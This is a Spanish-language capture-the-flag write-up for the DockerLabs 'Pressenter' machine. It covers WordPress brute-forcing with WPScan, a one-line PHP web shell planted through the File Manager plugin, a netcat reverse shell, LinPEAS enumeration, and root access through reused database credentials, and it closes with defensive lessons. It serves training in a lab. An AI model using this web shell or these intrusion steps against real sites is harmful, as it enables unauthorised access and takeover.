# Pressenter — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** d1se0  
**Fecha de creación:** 29/08/2024  
**Técnicas:** WordPress · WPScan · Reverse Shell · File Manager Plugin · LinPEAS · MySQL Enumeration · Credential Reuse

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración WordPress](#2-enumeración-wordpress)
3. [Fuerza bruta WordPress — WPScan](#3-fuerza-bruta-wordpress--wpscan)
4. [File Upload y Reverse Shell](#4-file-upload-y-reverse-shell)
5. [Enumeración interna — LinPEAS](#5-enumeración-interna--linpeas)
6. [Acceso a MySQL y reutilización de credenciales](#6-acceso-a-mysql-y-reutilización-de-credenciales)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh pressenter.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
80/tcp open http
```

Accedemos al servidor web y observamos la página principal de Pressenter CTF.

Inspeccionando el código fuente encontramos el dominio:

```text
pressenter.hl
```

Lo añadimos a `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
172.17.0.2 pressenter.hl
```

---

## 2. Enumeración WordPress

Enumeramos directorios:

```bash
dirb http://pressenter.hl/
```

Resultado:

```text
/wp-admin
/wp-content
/wp-includes
/xmlrpc.php
```

La aplicación utiliza WordPress.

---

## 3. Fuerza bruta WordPress — WPScan

Enumeramos usuarios:

```bash
wpscan --url http://pressenter.hl \
--enumerate u
```

Usuarios encontrados:

```text
pressi
hacker
```

Realizamos fuerza bruta contra el usuario `pressi`:

```bash
wpscan --url http://pressenter.hl \
--enumerate u \
-U pressi \
-P /usr/share/wordlists/rockyou.txt
```

Resultado:

```text
Username: pressi
Password: dumbass
```

Accedemos al panel de administración de WordPress.

---

## 4. File Upload y Reverse Shell

Instalamos el plugin:

```text
File Manager
```

Explorando los directorios observamos que varios ficheros PHP tienen permisos de lectura y escritura.

Editamos:

```text
hello.php
```

Añadimos:

```php
<?php
system($_GET["cmd"]);
?>
```

La ruta final es:

```text
pressenter/wp-content/plugins/hello.php
```

Comprobamos ejecución de comandos:

```text
http://pressenter.hl/wp-content/plugins/hello.php?cmd=id
```

Resultado:

```text
uid=33(www-data)
```

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Generamos una reverse shell Bash y obtenemos acceso:

```bash
whoami
www-data
```

---

## 5. Enumeración interna — LinPEAS

Transferimos LinPEAS desde nuestro host:

```bash
python3 -m http.server 8000
```

En la máquina víctima:

```bash
wget http://192.168.1.26:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS encuentra credenciales dentro de:

```text
/var/www/pressenter/wp-config.php
```

Resultado:

```php
define('DB_USER', 'admin');
define('DB_PASSWORD', 'rootbeable');
```

---

## 6. Acceso a MySQL y reutilización de credenciales

Accedemos a MySQL:

```bash
mysql -u admin -p -h localhost
```

Contraseña:

```text
rootbeable
```

Enumeramos bases de datos:

```sql
SHOW DATABASES;
```

Exploramos tablas y usuarios.

Encontramos credenciales:

```text
enter : rootbeable
```

Cambiamos al usuario:

```bash
su enter
```

Probamos reutilización de contraseña con root:

```bash
su root
```

Acceso correcto.

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| WordPress vulnerable a fuerza bruta | Acceso administrador |
| Plugin File Manager inseguro | Ejecución remota de comandos |
| Reverse Shell PHP | Acceso inicial |
| Credenciales en wp-config.php | Acceso a MySQL |
| Reutilización de contraseñas | Escalada a root |

**Para defenderse:**

- Restringir fuerza bruta en WordPress.
- Evitar plugins innecesarios o inseguros.
- No reutilizar contraseñas entre servicios.
- Proteger credenciales sensibles en archivos de configuración.
- Aplicar segmentación de privilegios.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
